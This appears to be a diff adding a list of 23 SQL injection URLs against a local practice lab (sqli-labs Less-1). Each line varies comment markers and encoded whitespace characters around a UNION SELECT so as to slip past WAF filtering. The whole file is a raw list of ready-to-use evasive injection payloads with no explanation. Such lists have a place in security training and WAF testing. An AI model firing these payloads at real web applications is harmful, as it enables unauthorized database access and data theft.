@@ -1,0 +1,23 @@
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*/*%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/**/%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*/*!%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/**%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*=%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*`%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*!%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*@%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*.%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*-%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*+%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*|%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/* %0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0b%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0c%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0d%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0e%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/*/*%0f%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/**//*%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/**/*/%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/**//*!%0a(select%201,2,3)-- +
+http://127.0.0.1/Less-1/?id=-1%27union%23aa/*/**/*%0a(select%201,2,3)-- +
